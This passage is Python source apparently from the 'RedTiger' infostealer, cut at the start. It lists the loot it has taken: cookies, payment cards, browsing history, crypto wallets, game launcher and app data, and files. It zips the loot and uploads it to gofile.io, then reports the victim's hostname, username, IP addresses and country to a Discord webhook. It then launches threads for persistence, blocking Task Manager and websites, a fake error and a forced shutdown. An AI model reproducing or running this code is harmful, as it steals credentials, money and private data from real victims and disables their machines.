        v4r_option.append(f"Cookies           : {v4r_number_cookies}")

    if v4r_number_cards != None:
        v4r_option.append(f"Cards             : {v4r_number_cards}")

    if v4r_number_history != None:
        v4r_option.append(f"Browsing History  : {v4r_number_history}")

    if v4r_number_downloads != None:
        v4r_option.append(f"Download History  : {v4r_number_downloads}")

    if v4r_number_extentions != None:
        v4r_option.append(f"Extentions        : {v4r_number_extentions}")

    if v4r_name_wallets != None:
        v4r_option.append(f"Wallets           : {v4r_name_wallets}")

    if v4r_name_game_launchers != None:
        v4r_option.append(f"Game Launchers    : {v4r_name_game_launchers}")
    
    if v4r_name_apps != None:
        v4r_option.append(f"Apps              : {v4r_name_apps}")
    
    if v4r_number_files != None:
        v4r_option.append(f"Interesting Files : {v4r_number_files}")

v4r_zip_buffer.seek(0)

try:
    try: v4r_gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
    except: v4r_gofileserver = "store4"

    v4r_response = requests.post(
        f"https://{v4r_gofileserver}.gofile.io/uploadFile",
        files={"file": (f"RedTiger_{v4r_username_pc.replace(' ', '_')}.zip", v4r_zip_buffer)}
    )

    v4r_download_link = v4r_response.json()["data"]["downloadPage"]
except Exception as e:
    v4r_download_link = f"Error: {e}"

embed = discord.Embed(title="Victim Affected", color=v4r_color_embed
).add_field(
    inline=False,
    name="Summary of Information", 
    value=f"""```
Hostname    : {v4r_hostname_pc}
Username    : {v4r_username_pc}
DisplayName : {v4r_displayname_pc}
Ip Public   : {v4r_ip_address_public}
Ip Local    : {v4r_ip_adress_local}
Country     : {v4r_country}```"""
).add_field(
    inline=False,
    name="Stolen Information", 
    value=f"""```swift
{"\n".join(v4r_option)}```"""
).add_field(
    inline=False,
    name="Download Link", 
    value=f"""{v4r_download_link}"""
).set_footer(
    text=v4r_footer_text, 
    icon_url=v4r_avatar_embed
)

try:  
    v4r_w3bh00k = discord.SyncWebhook.from_url(v4r_w3bh00k_ur1)
    v4r_w3bh00k.send(embed=embed, username=v4r_username_embed, avatar_url=v4r_avatar_embed)
except: pass


try: threading.Thread(target=D3f_B10ckK3y).start()
except: pass
try: threading.Thread(target=D3f_B10ckT45kM4n4g3r).start()
except: pass
try: threading.Thread(target=D3f_B10ckW3b5it3).start()
except: pass
try: threading.Thread(target=D3f_St4rtup).start()
except: pass
try: threading.Thread(target=D3f_Sp4m_Opti0ns).start()
except: pass
try: threading.Thread(target=D3f_R3st4rt).start()
except: pass
try: threading.Thread(target=D3f_F4k33rr0r).start()
except: pass
try: threading.Thread(target=D3f_Shutd0wn).start()
except: pass
